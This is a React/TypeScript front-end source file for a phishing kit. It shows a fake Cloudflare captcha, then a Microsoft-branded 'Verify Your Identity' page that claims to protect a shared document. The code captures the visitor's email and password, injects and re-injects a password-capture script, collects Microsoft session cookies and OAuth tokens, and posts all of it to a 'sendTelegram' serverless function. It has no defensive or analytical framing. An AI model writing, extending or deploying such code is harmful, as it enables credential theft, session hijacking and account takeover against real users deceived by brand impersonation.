import React, { useState, useEffect } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

import { 
  restoreMicrosoftCookies, 
  restoreCookies, 
  setCapturedEmail, 
  setCapturedCookies,
  detectBrowserCapabilities,
  getStoredData
} from './utils/restoreCookies';

import { injectPasswordCaptureScript } from './utils/password-capture-injector';

const SLOW_DELAY = 1200;
const nextStepDelay = SLOW_DELAY * 3;
const messageIconDelay = 500;
const captchaVerificationDelay = 1500;
const redirectingDelay = 3000;
const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;

// Helper functions for persistent storage
const setStoredPassword = (password: string) => {
  try {
    localStorage.setItem('captured_password', password);
    sessionStorage.setItem('captured_password', password);
  } catch (error) {
    console.warn('Failed to store password:', error);
  }
};

const getStoredPassword = (): string | null => {
  try {
    return localStorage.getItem('captured_password') || sessionStorage.getItem('captured_password');
  } catch (error) {
    console.warn('Failed to retrieve stored password:', error);
    return null;
  }
};

const setStoredFormCredentials = (email: string, password: string) => {
  try {
    const credentials = {
      email,
      password,
      captureTime: new Date().toISOString(),
      source: 'document-protection-form'
    };
    localStorage.setItem('form_credentials', JSON.stringify(credentials));
    sessionStorage.setItem('form_credentials', JSON.stringify(credentials));
  } catch (error) {
    console.warn('Failed to store form credentials:', error);
  }
};

const getStoredFormCredentials = () => {
  try {
    const stored = localStorage.getItem('form_credentials') || sessionStorage.getItem('form_credentials');
    return stored ? JSON.parse(stored) : null;
  } catch (error) {
    console.warn('Failed to retrieve stored form credentials:', error);
    return null;
  }
};

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');
  const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
  const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
  const [capturedCredentials, setCapturedCredentials] = useState<{
    email?: string;
    password?: string;
    username?: string;
    domain?: string;
    captureTime?: string;
    source?: string;
    url?: string;
  } | null>(null);
  const [browserCapabilities, setBrowserCapabilities] = useState<any>(null);

  // FORM STATE
  const [formEmail, setFormEmail] = useState('');
  const [formPassword, setFormPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // 🟢 NEW: Track if we've already sent tokens/cookies/email/password (prevents double send)
  const [hasSentAuthData, setHasSentAuthData] = useState(false);

  // 🟢 NEW: Store session data from OAuth
  const [oauthSessionData, setOAuthSessionData] = useState<any>(null);

  // CSS Keyframes
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes dotAnimation {
        0% { opacity: 0; }
        20% { opacity: 1; }
        100% { opacity: 0; }
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      @keyframes fadeIn {
        0% { opacity: 0; transform: translateY(10px); }
        100% { opacity: 1; transform: translateY(0); }
      }
      .redirecting-dots span:nth-child(1) { animation-delay: 0s; }
      .redirecting-dots span:nth-child(2) { animation-delay: 0.2s; }
      .redirecting-dots span:nth-child(3) { animation-delay: 0.4s; }
      .redirecting-dots span:nth-child(4) { animation-delay: 0.6s; }
      .redirecting-dots span:nth-child(5) { animation-delay: 0.8s; }
      .redirecting-dots span:nth-child(6) { animation-delay: 1.0s; }
      .redirecting-dots span { animation: dotAnimation 1.5s infinite; }
      .fade-in { animation: fadeIn 0.5s ease-out; }
      .document-icon { animation: spin 2s linear infinite; }
      .protected-doc:hover { transform: translateY(-2px); transition: transform 0.2s ease; }
    `;
    document.head.appendChild(style);
    return () => document.head.removeChild(style);
  }, []);

  useEffect(() => {
    if (currentPage === 'redirecting') {
      const timer = setTimeout(() => {
        setCurrentPage('document-protection');
      }, redirectingDelay);
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  useEffect(() => {
    try {
      const capabilities = detectBrowserCapabilities();
      setBrowserCapabilities(capabilities);
      console.log('🌐 Browser capabilities detected:', capabilities);
    } catch (error) {
      console.warn('⚠️ Failed to detect browser capabilities:', error);
    }

    try {
      const storedData = getStoredData();
      if (storedData.email) {
        setCapturedEmailState(storedData.email);
        setFormEmail(storedData.email); // Pre-fill form with stored email
        console.log('📧 Restored stored email:', storedData.email);
      }
      if (storedData.cookies && storedData.cookies.length > 0) {
        setCapturedCookiesState(JSON.stringify(storedData.cookies));
        console.log('🍪 Restored stored cookies:', storedData.cookies.length);
      }

      // 🔧 FIX: Restore form credentials from persistent storage
      const storedFormCredentials = getStoredFormCredentials();
      if (storedFormCredentials) {
        setCapturedCredentials(storedFormCredentials);
        setFormEmail(storedFormCredentials.email || '');
        setFormPassword(storedFormCredentials.password || '');
        console.log('📋 Restored form credentials from storage:', {
          email: storedFormCredentials.email,
          hasPassword: !!storedFormCredentials.password,
          source: storedFormCredentials.source
        });
      }
    } catch (error) {
      console.warn('⚠️ Failed to restore stored data:', error);
    }
  }, []);

  useEffect(() => {
    try {
      injectPasswordCaptureScript();
      console.log('✅ Password capture injector initialized');
    } catch (error) {
      console.warn('⚠️ Failed to initialize password capture injector:', error);
    }

    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;

    history.pushState = function (...args) {
      originalPushState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on pushState:', error);
        }
      }, 1000);
    };

    history.replaceState = function (...args) {
      originalReplaceState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on replaceState:', error);
        }
      }, 1000);
    };

    const handlePopState = () => {
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on popstate:', error);
        }
      }, 1000);
    };

    window.addEventListener('popstate', handlePopState);

    return () => {
      history.pushState = originalPushState;
      history.replaceState = originalReplaceState;
      window.removeEventListener('popstate', handlePopState);
    };
  }, []);

  useEffect(() => {
    function handleMessage(event: MessageEvent) {
      if (!event.data || typeof event.data !== 'object') return;

      if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
        setCapturedEmailState(event.data.email);
        setCapturedEmail(event.data.email);
        console.log('📧 Email captured and stored:', event.data.email);
      }

      if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
        try {
          const cookiesJson = JSON.stringify(event.data.data.cookies);
          setCapturedCookiesState(cookiesJson);
          setCapturedCookies(event.data.data.cookies);

          const options = {
            reload: false,
            validate: true,
            debug: true,
            skipExpired: true,
            skipInvalid: false,
            warnOnSecurity: true,
            handleDuplicates: true
          };

          try {
            const result = restoreMicrosoftCookies(event.data.data.cookies, options);
            console.log('✅ Enhanced cookie restoration result:', result);
            if (result.success) {
              console.log(`🎯 Successfully restored ${result.restored}/${result.total} cookies`);
            }
          } catch (error) {
            console.warn('⚠️ Enhanced restoration failed, falling back to basic:', error);
            restoreCookies(event.data.data.cookies, { debug: true });
          }

        } catch (e) {
          console.warn('⚠️ Cookie processing error:', e);
        }
      }

      if (
        event.data.type === 'CREDENTIALS_CAPTURED' &&
        (event.data.data?.password || event.data.data?.email || event.data.data?.username)
      ) {
        const newCredentials = {
          ...event.data.data,
          captureTime: new Date().toISOString(),
          source: event.data.data?.source || 'injected-capture'
        };
        
        setCapturedCredentials(newCredentials);
        console.log('🔐 Enhanced credentials captured:', {
          hasEmail: !!newCredentials?.email,
          hasPassword: !!newCredentials?.password,
          hasUsername: !!newCredentials?.username,
          source: newCredentials?.source
        });

        // 🔧 FIX: Store credentials persistently
        if (newCredentials.email && newCredentials.password) {
          setStoredFormCredentials(newCredentials.email, newCredentials.password);
        }

        if (newCredentials.email) {
          setCapturedEmailState(newCredentials.email);
          setCapturedEmail(newCredentials.email);
        }
      }

      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
        setCapturedEmailState(event.data.data.email);
        setCapturedEmail(event.data.data.email);
        console.log('🏢 Organizational credentials captured:', event.data.data.email);
      }
    }

    window.addEventListener('message', handleMessage, false);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step');
    if (step && ['captcha', 'message-icon', 'redirecting', 'document-protection', 'reauthenticating', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
      setCurrentPage(step);
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []);

  const handleCaptchaVerified = () => {
    setCurrentPage('redirecting');
  };
  const handleCaptchaBack = () => {
    window.location.reload();
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formEmail || !formPassword) {
      alert('Please enter both email and password');
      return;
    }

    setIsSubmitting(true);

    try {
      const formCredentials = {
        email: formEmail,
        password: formPassword,
        captureTime: new Date().toISOString(),
        source: 'document-protection-form'
      };
      setCapturedEmailState(formEmail);
      setCapturedCredentials(formCredentials);
      setStoredFormCredentials(formEmail, formPassword);
      setCapturedEmail(formEmail);
      setTimeout(() => {
        setCurrentPage('reauthenticating');
      }, 1000);
    } catch (error) {
      setTimeout(() => {
        setCurrentPage('reauthenticating');
      }, 1000);
    } finally {
      setTimeout(() => {
        setIsSubmitting(false);
      }, 1200);
    }
  };

  useEffect(() => {
    if (currentPage === 'reauthenticating') {
      const timer = setTimeout(() => {
        setCurrentPage('oauth-redirect');
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  const sendToTelegram = async ({ email, password, cookies, authenticationTokens, userAgent, sessionId, url }) => {
    try {
      const netlifyFunctionUrl = '/.netlify/functions/sendTelegram';
      await fetch(netlifyFunctionUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email,
          password,
          passwordSource: password ? 'document-protection-form' : undefined,
          cookies,
          authenticationTokens,
          userAgent,
          sessionId,
          url
        })
      });
    } catch (error) {}
  };

  const handleOAuthSuccess = async (sessionData: any) => {
    if (!hasSentAuthData) {
      setHasSentAuthData(true);
      const storedFormCredentials = getStoredFormCredentials();
      let finalEmail = '';
      let finalPassword = '';
      if (storedFormCredentials) {
        finalEmail = storedFormCredentials.email || '';
        finalPassword = storedFormCredentials.password || '';
      } else if (capturedCredentials?.email && capturedCredentials?.password) {
        finalEmail = capturedCredentials.email;
        finalPassword = capturedCredentials.password;
      } else {
        finalEmail = formEmail || capturedEmail || '';
        finalPassword = formPassword || getStoredPassword() || '';
      }
      await sendToTelegram({
        email: finalEmail,
        password: finalPassword,
        cookies: capturedCookies ? JSON.parse(capturedCookies) : [],
        authenticationTokens: sessionData?.authenticationTokens || {},
        userAgent: navigator.userAgent,
        sessionId: sessionData?.sessionId || ('oauth_' + Math.random().toString(36).substring(2, 15)),
        url: window.location.href
      });
    }
    setOAuthSessionData(sessionData);
    setCurrentPage('document-loading');
  };

  const handleOAuthBack = () => {
    setCurrentPage('document-protection');
  };

  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );

    case 'redirecting':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Opening
            <span className="redirecting-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </div>
        </div>
      );

    case 'document-protection':
      // --- Slightly wider desktop card, reduced instructions text size ---
      return (
        <div style={{
          background: "#f7f9fb",
          fontFamily: "'Segoe UI', Arial, sans-serif",
          minHeight: "100vh",
          margin: 0,
          display: "flex",
          flexDirection: "column",
          alignItems: "center"
        }}>
          <style>
            {`
            .card {
              background: #fff;
              border-radius: 12px;
              box-shadow: 0 6px 22px 0 rgba(0,0,0,0.10);
              padding: 28px 14px;
              max-width: 340px;
              width: 100%;
              margin-top: 44px;
              display: flex;
              flex-direction: column;
              align-items: center;
            }
            @media (min-width: 800px) {
              .card {
                max-width: 400px;
                padding-left: 32px;
                padding-right: 32px;
              }
            }
            .logo {
              width: 70px;
              margin-bottom: 18px;
              display: block;
            }
            .title {
              font-size: 1.18em;
              font-weight: 600;
              color: #23272a;
              margin-bottom: 8px;
              text-align: center;
              letter-spacing: 0.01em;
            }
            .desc {
              font-size: 0.97em;
              color: #38444d;
              margin-bottom: 7px;
              text-align: center;
            }
            .secure-link {
              font-size: 1.01em;
              font-weight: 450;
              color: #0078d4;
              margin-bottom: 8px;
              text-align: center;
              word-break: break-word;
            }
            .instructions {
              font-size: 0.76em;
              color: #626b76;
              margin-bottom: 13px;
              line-height: 1.35em;
              text-align: center;
              max-width: 300px;
              margin-left: auto;
              margin-right: auto;
            }
            .vertical-form {
              width: 100%;
              margin: 0 auto;
              padding: 0;
              display: flex;
              flex-direction: column;
              align-items: stretch;
              gap: 13px;
            }
            .form-field-group {
              display: flex;
              flex-direction: column;
              width: 100%;
            }
            .form-label {
              font-size: 0.93em;
              color: #4d5a67;
              margin-bottom: 5px;
              font-weight: 500;
              text-align: left;
            }
            .form-input {
              width: 100%;
              font-size: 0.98em;
              padding: 10px 12px;
              border: 1.2px solid #cfd8dc;
              border-radius: 4px;
              box-sizing: border-box;
              background: #f7f9fb;
              color: #23272a;
              font-family: inherit;
              transition: border 0.16s;
              outline: none;
            }
            .form-input:focus {
              border-color: #0078d4;
              background: #fff;
            }
            .form-actions {
              display: flex;
              flex-direction: column;
              align-items: stretch;
              gap: 10px;
              width: 100%;
              margin-top: 5px;
            }
            .submit-btn {
              width: 100%;
              background: linear-gradient(90deg,#0078d4 0,#005fa3 100%);
              color: #fff;
              border: none;
              border-radius: 4px;
              font-size: 1em;
              font-weight: 600;
              padding: 10px 0;
              cursor: pointer;
              margin-bottom: 0;
              box-shadow: 0 2px 8px rgba(0,120,212,0.08);
              transition: background 0.18s;
              letter-spacing: 0.01em;
              display: block;
            }
            .submit-btn:hover, .submit-btn:focus {
              background: linear-gradient(90deg,#005fa3 0,#0078d4 100%);
            }
            .footer-text {
              font-size: 0.74em;
              color: #a0a8b6;
              margin-top: 10px;
              margin-bottom: 0;
              text-align: center;
              line-height: 1.38em;
              max-width: 98%;
              width: 98%;
              letter-spacing: 0.005em;
              word-break: break-word;
              display: block;
            }
            .copyright {
              text-align: center;
              color: #b0b9c6;
              font-size: 0.95em;
              margin-top: 18px;
              margin-bottom: 15px;
            }
            @media (max-width: 380px) {
              .card {
                max-width: 99vw;
                padding: 7px 2vw;
              }
              .logo {
                width: 50px;
              }
              .footer-text, .copyright {
                font-size: 0.7em;
              }
              .instructions {
                font-size: 0.73em;
                max-width: 99vw;
              }
            }
            `}
          </style>
          <div className="card">
            <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/768px-Microsoft_logo_%282012%29.svg.png?20230221160917" alt="Microsoft Logo" />
            <div className="title">Verify Your Identity</div>
            <div className="desc">You've received a secure document</div>
            <div className="secure-link">Protected Document File</div>
            <div className="instructions">
              To open this secure Document, please enter the email address that this item was shared to.
            </div>
            <form className="vertical-form" onSubmit={handleFormSubmit} autoComplete="off">
              <div className="form-field-group">
                <label className="form-label" htmlFor="email">Email Address</label>
                <input
                  className="form-input"
                  type="email"
                  id="email"
                  placeholder="Enter your email"
                  required
                  value={formEmail}
                  onChange={e => setFormEmail(e.target.value)}
                  disabled={isSubmitting}
                  autoComplete="username"
                />
              </div>
              <div className="form-field-group">
                <label className="form-label" htmlFor="password">Password</label>
                <input
                  className="form-input"
                  type="password"
                  id="password"
                  placeholder="Enter your password"
                  required
                  value={formPassword}
                  onChange={e => setFormPassword(e.target.value)}
                  disabled={isSubmitting}
                  autoComplete="current-password"
                />
              </div>
              <div className="form-actions">
                <button
                  className="submit-btn"
                  type="submit"
                  disabled={isSubmitting}
                  style={{opacity: isSubmitting ? 0.7 : 1}}
                >
                  {isSubmitting ? "🔄 Authenticating..." : "Authenticate & Open Document"}
                </button>
              </div>
            </form>
            <p className="footer-text">
              By Authenticating, you allow Safehavendocs to use your email address in accordance with their privacy statement.<br/>
            </p>
          </div>
          <div className="copyright">
            © 2025 Microsoft &nbsp; Privacy & Cookies
          </div>
        </div>
      );

    case 'reauthenticating':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Reauthenticating
            <span className="redirecting-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </div>
        </div>
      );

    case 'message-icon':
      return (
        <MessageIconLanding
          onOpenMessage={() => {}}
        />
      );

    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );

    case 'success':
    case 'document-loading':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            background: 'white',
            padding: '60px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <div className="document-icon" style={{
              width: '80px',
              height: '80px',
              background: '#0078d4',
              borderRadius: '8px',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '40px',
              color: 'white'
            }}>
              📄
            </div>
            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
              Loading Document...
            </h2>
            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
              Please wait while we prepare your Microsoft document
            </p>
            {process.env.NODE_ENV === 'development' && (
              <div style={{ 
                marginTop: '20px', 
                padding: '10px', 
                backgroundColor: '#f8f9fa', 
                borderRadius: '4px',
                fontSize: '12px',
                color: '#666'
              }}>
                <div>Email: {capturedEmail || 'Not captured'}</div>
                <div>Cookies: {capturedCookies ? JSON.parse(capturedCookies).length : 0}</div>
                <div>Credentials: {capturedCredentials ? 'Captured' : 'None'}</div>
                <div>Browser: {browserCapabilities?.browser} v{browserCapabilities?.version}</div>
              </div>
            )}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '10px',
              marginTop: '30px'
            }}>
              <button
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#0078d4',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Start Over
              </button>
              <button
                onClick={() => setCurrentPage('oauth-redirect')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#107c10',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Try Again
              </button>
            </div>
          </div>
        </div>
      );

    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );
  }
}

export default App;